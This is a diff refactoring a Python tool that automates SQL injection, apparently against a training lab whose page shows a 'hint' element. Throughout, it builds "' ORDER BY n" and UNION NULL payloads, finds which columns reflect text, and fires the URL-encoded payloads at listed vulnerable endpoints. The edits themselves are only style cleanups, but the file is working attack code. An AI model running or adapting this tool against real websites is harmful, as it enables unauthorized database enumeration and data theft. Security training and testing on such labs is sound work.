@@ -11,39 +11,33 @@ log.set_config()
 
 
 def swap_null_w_str(pld, text_str, index, options: list):
-    db_comment = options[1]
-    num_cols = options[2]
-    # Stripping NULL--
-    str_pld = pld[:-6]
-    # Adding our text string
-    str_pld += "'" + text_str + "'"
-    # Adding NULLs
-    while (index < num_cols):
-        str_pld += ", NULL"
-        index += 1
-    str_pld += db_comment 
+    db_comment, num_cols = options[1], options[2]
+    # Stripping NULL--, adding our text string
+    str_pld = f"{pld[:-6]}'{text_str}'" + ", NULL" * (num_cols - index) + db_comment
     return str_pld
+
 
 def find_string_to_reflect(url):
     r = requests.get(url)
     soup = BeautifulSoup(r.text, 'html.parser')
     text_str = soup.find(id="hint")
     if text_str:
-        text_str = text_str.string.split(':')[1]
+        text_str = text_str.string.split(': ')[1]
         # Stripping character '
-        text_str = text_str[2:-1]
+        text_str = text_str[1:-1]
     else:
         # Generating a custom string
-        text_str = ''.join(random.choices(string.ascii_letters + string.digits, k=15))
-    return text_str 
+        text_str = ''.join(random.choices(
+            string.ascii_letters + string.digits, k=15))
+    return text_str
 
 
 def find_text_cols(url, options: list):
-    vuln_endpoints = options[0]
+    vuln_endpoints, db_comment, num_cols = options[0], options[1], options[2]
     text_str = find_string_to_reflect(url)
     for endp in vuln_endpoints:
-        for index in range(1, int(options[2]) + 1):
-            pld = generate_null_pld(options[1], index)
+        for index in range(1, int(num_cols) + 1):
+            pld = generate_null_pld(db_comment, index)
             pld = swap_null_w_str(pld, text_str, index, options)
             pld = requests.utils.quote(pld)
             r = requests.get(url=url + endp + pld)
@@ -54,11 +48,10 @@ def find_text_cols(url, options: list):
                 log.logger.info(f"{GREEN}[+]{RESET} Column {index} "
                                 "contains text, appending it to list")
                 options[3].append(index)
-    
+
 
 def try_order_by_sqli(url, options: list):
-    vuln_endpoints = options[0]
-    db_comment = options[1]
+    vuln_endpoints, db_comment = options[0], options[1]
     for endp in vuln_endpoints:
         for index in range(1, 25):
             pld = "' ORDER BY " + str(index) + db_comment
@@ -86,8 +79,7 @@ def generate_null_pld(db_comment, index):
 
 
 def try_null_sqli(url, options: list):
-    vuln_endpoints = options[0]
-    db_comment = options[1]
+    vuln_endpoints, db_comment = options[0], options[1]
     for endp in vuln_endpoints:
         for index in range(0, 25):
             pld = generate_null_pld(db_comment, index)
